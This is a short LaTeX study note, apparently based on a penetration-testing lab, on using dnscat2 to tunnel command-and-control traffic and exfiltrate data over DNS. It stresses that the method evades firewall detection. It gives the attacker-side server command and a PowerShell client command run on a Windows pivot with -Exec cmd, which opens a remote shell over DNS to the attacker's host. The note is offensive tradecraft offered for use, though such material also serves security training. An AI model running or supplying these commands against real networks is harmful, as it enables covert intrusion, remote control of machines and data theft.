
\section{DNS tunneling with dnscat2}
\href{https://github.com/iagox86/dnscat2}{Dnscat2} is a tunneling tool that
uses DNS protocol to send data between two hosts. It uses an encrypted
Command-\&-Control (C\&C or C2) channel and sends data inside TXT records
within the DNS protocol. 

Usually, every active directory domain environment in
a corporate network will have its own DNS server, which will resolve hostnames
to IP addresses and route the traffic to external DNS servers participating in
the overarching DNS system. 

However, with dnscat2, the address resolution is requested from an external
server. When a local DNS server tries to resolve an address, data is
exfiltrated and sent over the network instead of a legitimate DNS request. a

Dnscat2 can be an {\bf extremely stealthy approach} to exfiltrate data while

evading firewall detections which strip the HTTPS connections and sniff the
traffic. 

\subsection{On attacker}
\begin{verbatim}
sudo ruby dnscat2.rb --dns host=$L_IP,port=53,domain=inlanefreight.local --no-cache
\end{verbatim}


it will provide us the secret key that must be provided to the dnscat2 client in
order to authenticate and encrypt the communication

\subsection{On pivot}
use
\href{https://github.com/lukebaggett/dnscat2-powershell}{dnscat2-powershell}, a
dnscat2 compatible PowerShell-based client that we can run from Windows
targets.

\begin{verbatim}
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver $L_IP -Domain inlanefreight.local \
    -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
\end{verbatim}